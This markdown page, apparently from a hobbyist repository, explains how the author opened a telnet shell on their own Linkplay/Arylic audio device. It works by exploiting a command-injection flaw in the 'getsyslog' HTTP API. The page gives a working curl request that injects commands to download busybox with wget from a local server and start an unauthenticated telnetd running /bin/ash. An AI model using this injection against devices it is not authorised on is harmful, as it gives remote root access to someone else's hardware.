# Enable telnetd
To enable telnetd on these devices, a security vulnerability had to be exploited. The first version on my devices was 4.2.8020 from 2020/02/20 (20th of Feb 2020) that still had a vulnerability in their code: internally a "sprintf" function was used to prepare a Linux CLI commands. That function was using an IP address as an input, but the input could be extended with ";" and additional commands to download and install a telnetd.

The command that has this vulnerability is **_"getsyslog"_**, see https://developer.arylic.com/httpapi/#get-system-log and https://labs.withsecure.com/advisories/linkplay-firmware-wanlan-remote-code-execution. The command has an option to add an IP address from a slave device, e.g. **_"getsyslog:ip:10.1.1.90"_**, so a CLI command is executed on the device to retrieve the system log from the slave device that includes the IP address. Instead of just having an IP address as a parameter, that CLI command can also include a ";" and a second CLI command. You do not even have to provide an IP address, but can append the ";" and second command directly after the ":ip:". 

If your Linkplay device is running a newer version, you may have to downgrade the firmware first, see [Downgrade Firmware](/Downgrade.md).

The following code snippets are using the IP address 10.1.1.58 for my Arylic Up2Stream device and 10.1.1.22 for a web server running on my local MacMini. You need to create the subdirectories on your web server and copy the busybox binary to it. On my Mac mini it's the directory ***/Library/WebServer/Documents/linkplay*** that is accessible as http://10.1.1.22/linkplay. To organize all the files on my web server I've created several subdirectories below to store the binary file (***.../linkplay/a31/bin/busybox***).
```
curl "http://10.1.1.58/httpapi.asp?command=getsyslog:ip:10.1.1.22/index.html;mkdir+/tmp/bin;wget+-O+/tmp/bin/busybox+-T+5+http://10.1.1.22/linkplay/a31/bin/busybox+-q;chmod+555+/tmp/bin/busybox;ln+-s/tmp/bin/busybox+/tmp/bin/telnetd;/tmp/bin/telnetd+telnetd+-l/bin/ash;"
```
The command above is executing the following commands on the device in addition to the "getsyslog" request:
```
mkdir /tmp/bin
wget -O /tmp/bin/busybox -T 5 http://10.1.1.22/linkplay/a31/bin/busybox -q;
chmod 555 /tmp/bin/busybox;
ln -s /tmp/bin/busybox /tmp/bin/telnetd;
/tmp/bin/telnetd telnetd -l/bin/ash;
```
> **Note:**
> Don't forget to add a ";" at the end inside the quotes. Replace all spaces with "+" if you want to create your own URL with curl.

The tool **_"busybox"_** is like a swiss army knife and combines a lot of CLI commands in a single binary file. That file was stripped down in the version that was running on my Linplay device and does not include a telnetd anymore. Therefore you have to get a full version from somewhere. 

A version of busybox is provided here (see binary directory). That binary is compatible with the SoC that is running on the Linkplay A31 module, see [Hardware and Firmware](/Hardware.md) for details about the hardware.

There is an OpenWRT archive available where you can get precompiled binaries for almost all utilities you may need. See section [Hardware and Firmware](/Hardware.md) for details.
